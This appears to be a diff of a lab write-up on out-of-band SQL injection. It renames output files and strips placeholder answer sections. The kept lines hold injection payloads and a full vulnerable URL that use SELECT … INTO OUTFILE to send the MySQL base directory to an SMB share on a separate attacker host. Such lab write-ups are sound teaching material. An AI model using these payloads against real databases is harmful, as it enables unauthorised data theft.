@@ -146,13 +146,7 @@ cat /tmp/out.txt
 <img width="1097" height="649" alt="Screenshot 2026-08-28 at 5 54 25 AM" src="https://github.com/user-attachments/assets/e2e7ca9c-b777-4b63-981c-4a4918d776fb" />
 
 
-### Question 1 Answer
 
-```
-[INSERT THE VALUE RETURNED BY cat /tmp/out.txt]
-```
-
----
 
 ### Question 2 — Retrieve `@@basedir`
 
@@ -161,13 +155,13 @@ The same technique was used, but `@@version` was replaced with `@@basedir`.
 Payload:
 
 ```
-1'; SELECT @@basedir INTO OUTFILE '\\\\192.168.189.227\\logs\\out.txt'; --
+1'; SELECT @@basedir INTO OUTFILE '\\\\192.168.189.227\\logs\\out1.txt'; --
 ```
 
 Use the vulnerable URL:
 
 ```
-http://10.48.168.120/oob/search_visitor.php?visitor_name=1'; SELECT @@basedir INTO OUTFILE '\\\\192.168.189.227\\logs\\out.txt'; --
+http://10.48.168.120/oob/search_visitor.php?visitor_name=1'; SELECT @@basedir INTO OUTFILE '\\\\192.168.189.227\\logs\\out1.txt'; --
 ```
 
 
@@ -177,19 +171,11 @@ http://10.48.168.120/oob/search_visitor.php?visitor_name=1'; SELECT @@basedir IN
 After executing the request, the output file was read using:
 
 ```bash
-cat /tmp/out.txt
+cat /tmp/out1.txt
 ```
 <img width="1078" height="579" alt="Screenshot 2026-08-28 at 6 13 23 AM" src="https://github.com/user-attachments/assets/bf1123f4-300d-4080-8cde-40418c1b0f38" />
 
 
-
-### Question 2 Answer
-
-```
-[INSERT THE VALUE RETURNED BY cat /tmp/out.txt]
-```
-
----
 
 ## 6. Result/Evidence
 
@@ -216,7 +202,7 @@ MySQL Version: [INSERT ACTUAL OUTPUT]
 For **Question 2**, the MySQL base directory was similarly written to the SMB share and retrieved using:
 
 ```bash
-cat /tmp/out.txt
+cat /tmp/out1.txt
 ```
 
 **Evidence:**
@@ -225,14 +211,7 @@ cat /tmp/out.txt
 MySQL Base Directory: [INSERT ACTUAL OUTPUT]
 ```
 
-Recommended screenshots:
 
-1. SMB server running.
-2. Vulnerable URL/payload.
-3. `ls /tmp` showing `out.txt`.
-4. `cat /tmp/out.txt` showing the result.
-
----
 
 ## 7. Impact
 
